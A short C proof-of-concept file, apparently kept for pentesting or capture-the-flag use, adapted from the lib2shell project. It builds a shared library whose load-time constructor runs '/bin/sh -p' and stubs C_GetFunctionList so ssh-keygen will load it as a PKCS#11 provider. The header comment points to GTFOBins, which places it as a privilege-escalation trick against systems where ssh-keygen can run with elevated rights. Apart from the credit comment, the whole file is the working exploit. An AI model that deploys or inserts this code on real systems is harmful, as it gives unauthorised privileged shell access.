/*
This one is not mine but a re-modified version of a script
from a fork here: https://github.com/jonasheschl/lib2shell-ssh-keygen
of this one: https://github.com/SeanPesce/lib2shell
This is a solution proposed by Sean Pesces on his blog
https://seanpesce.blogspot.com/2023/03/leveraging-ssh-keygen-for-arbitrary.html
The original provided a windows support that was not needed here
I barely modified it (just removed what I did not need)
As this was hard to come by I wanted to also keep a minimal Poc copy here
For compilation and usage check the blog (link provided) also GTFOBins
*/
#include <stdio.h>
#include <unistd.h>
#define SHELL_PATH "/bin/sh"
void __attribute__ ((constructor)) constructor() {
	long long err = execl(SHELL_PATH, SHELL_PATH, "-p", NULL);
	printf("Result: %lld\n", err);
}
int C_GetFunctionList() {
	return 1;
}
